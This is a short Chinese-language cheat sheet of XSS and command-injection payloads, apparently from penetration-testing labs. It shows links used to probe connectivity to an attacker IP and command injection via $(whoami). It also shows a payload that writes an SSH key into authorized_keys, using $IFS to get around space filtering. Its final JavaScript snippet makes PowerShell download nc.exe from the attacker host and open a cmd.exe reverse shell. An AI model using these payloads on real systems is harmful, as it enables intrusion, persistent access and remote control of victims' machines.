# xss

```bash
1. 测试连通

连接
Test <a href="http://10.10.14.29/title">title link</a>
测试连接一个文件
Test <a href="http://10.10.14.29/content">body link</a>
<script> alert("Test")</script>

本地开启nc监听端口，可以看到命令执行回显
如果存在
2.  测试命令执行

Test <a href="http://10.10.14.29/$(whoami)">body link</a>
<script> alert("Test")</script>

3. 写入密钥
$IFS是空格替代
Test <a href="http://10.10.14.29/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIPU+OHcWDuZN6NJak2W2C3ee4pAoAKO5FPkt0SyDqpvE'>'/home/web/.ssh/authorized_keys')">body link</a>
<script> alert("Test")</script>
```

1. xss反弹shell

```
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.6/nc.exe -outfile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.14.6 1234';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```
